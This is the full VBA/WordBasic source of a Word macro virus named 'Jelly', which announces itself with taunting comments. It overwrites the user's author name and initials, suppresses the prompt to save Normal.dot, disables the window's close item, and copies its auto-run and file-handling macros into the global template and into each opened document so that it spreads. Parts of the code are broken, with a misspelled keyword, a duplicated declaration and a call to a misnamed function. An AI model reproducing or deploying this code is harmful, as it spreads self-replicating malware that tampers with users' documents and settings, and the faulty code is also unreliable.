   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Jelly"
   Dim ModifyMenuA
   Dim enabled
   Dim disabled
   Dim x

   Rem This macro computer virus was created by Shield Canada.
   Rem Happy birthday. This is the Jelly virus >:-)

   On Error GoTo -1: On Error GoTo ErrorHandler

   Rem Change the author to Jelly and the initials to HA >:-)
   WordBasic.ToolsOptionsUserInfo Name:="Jelly", Initials:="HA"

   Rem Doesn't prompt to save Normal.dot
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0


       Private Declare Function GetMenuItemID Lib "User32" (ByVal hmenu As Integer, ByVal nPos As Integer) As Integer

       Private Declare Function GetSystemMenu Lib "User32" (ByVal hWnd As Integer, ByVal bRevert As Integer) As Integer

       Private Declare Function FindWindowA Lib "User32" (ByVal lpClassName$, ByVal lpWindowName As Long) As Integer

       Private Declare Function GetFocus Lib "User32" () As Integer

       Private Declare Function GetSystemMenu Lib "User32" (ByVal hWnd As Integer, ByVal bRevert As Integer) As Integer

       Private Declare Funtion ModifyMenuA Lib "User32"(ByVal hMenu As Integer, ByVal nPosition As Integer, ByVal wIDNewItem As Integer, ByVal lpString$) As Integer

       enabled = 0: disabled = 1

       Rem Disable close and change it to Jelly
       x = AlterMenu("Jelly", 6, disabled)

       Private Function AlterMenu(item$, item_, flag)
   Dim hWnd
   Dim hmenu
   Dim hItem
   Dim FName$
   Dim MacName$

           hWnd = FindWindowA("OPUSAPP", 0)
           hmenu = GetSystemMenu(hWnd, 0)
           hItem = GetMenuItemID(hmenu, item_)
           AlterMenu = ModifyMenuA__(hmenu, hItem, flag, -10, item$)

       End Function

       WordBasic.MsgBox "Welcome to my world >:-) From the Jelly virus."

       FName$ = WordBasic.[FileName$]()
       MacName$ = FName$ + ":AutoOpen"

       Rem Infection time! Ha ha ha!!! >:-)

       If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
       WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
       WordBasic.MacroCopy MacName$, "Global:AutoExec", 1
       WordBasic.MacroCopy MacName$, "Global:FileNew", 1
       WordBasic.MacroCopy MacName$, "Global:FileSave", 1
       WordBasic.MacroCopy MacName$, "Global:FileSaveAs", 1
       WordBasic.MacroCopy MacName$, "Global:FileOpen", 1
       WordBasic.MacroCopy MacName$, "Global:Jelly", 1

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
       MacName$ = FName$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo AutoExecHandler
       MacName$ = FName$ + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoExec", MacName$, 1
   AutoExecHandler:

   On Error GoTo -1: On Error GoTo FileNewHandler
       MacName$ = FName$ + ":FileNew"
       WordBasic.MacroCopy "Global:FileNew", MacName$, 1
   FileNewHandler:

   On Error GoTo -1: On Error GoTo FileSaveHandler
       MacName$ = FName$ + ":FileSave"
       WordBasic.MacroCopy "Global:FileSave", MacName$, 1
   FileSaveHandler:

   On Error GoTo -1: On Error GoTo FileSaveAsHandler
       MacName$ = FName$ + ":FileSaveAs"
       WordBasic.MacroCopy "Global:FileSaveAs", MacName$, 1
   FileSaveAsHandler:

   On Error GoTo -1: On Error GoTo FileOpenHandler
       MacName$ = FName$ + ":FileOpen"
       WordBasic.MacroCopy "Global:FileOpen", MacName$, 1
   FileOpenHandler:

   On Error GoTo -1: On Error GoTo JellyHandler
       MacName$ = FName$ + ":Jelly"
       WordBasic.MacroCopy "Global:Jelly", MacName$, 1
   JellyHandler:

   If WordBasic.[FileName$]() <> "" Then
       WordBasic.FileSaveAs Format:=1
   End If

   End
